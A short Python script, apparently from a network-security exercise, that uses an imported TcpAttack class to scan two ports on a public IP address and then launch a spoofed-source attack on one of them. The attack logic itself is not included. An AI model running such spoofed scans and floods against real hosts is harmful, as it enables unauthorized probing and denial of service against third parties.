#! /usr/bin/env python3
from TcpAttack import *

if __name__ == "__main__":

    spoofIP = "233.233.233.233"
    #targetIP = "127.0.0.1"
    targetIP = "134.209.60.57"

    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(2332, 2333)
    if(Tcp.attackTarget(2333, 5)):
        print('port was open to attack')

